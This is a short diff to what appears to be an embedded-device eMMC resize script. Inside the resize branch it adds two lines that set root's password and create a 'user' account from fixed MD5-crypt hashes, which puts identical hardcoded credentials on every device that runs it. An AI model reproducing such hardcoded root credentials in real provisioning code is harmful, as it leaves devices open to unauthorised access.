@@ -12,6 +12,8 @@ fi
 P2SIZE=$(fdisk -l | grep /dev/mmcblk0p2 | awk '{print $3}')
 #echo $P2SIZE
 if [ "$P2SIZE" -le  2000000 ]; then
+    usermod -p '$1$h9pNG5Xe$xJdDzk4hIQJTrUmpNZeQt1' root
+    useradd -p '$1$OCJuf78E$yZJLb9cj.UKDG6sgZIXCV/' user
     echo "eMMC Need Resize"
     (
      echo d
